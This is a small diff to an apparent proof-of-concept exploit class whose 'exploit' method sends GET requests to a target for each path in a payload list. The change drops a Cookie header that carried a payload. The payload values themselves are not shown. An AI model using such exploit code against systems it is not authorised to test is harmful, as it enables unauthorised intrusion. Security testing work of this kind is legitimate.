@@ -37,7 +37,7 @@ class poc(object):
     
     def exploit(self, target):
         
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)','Cookie': self.payload}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:52.0)'}
         try:
             for i,path in enumerate(self.payload_list):
                 res = requests.get(target+path, headers=headers, timeout=30)
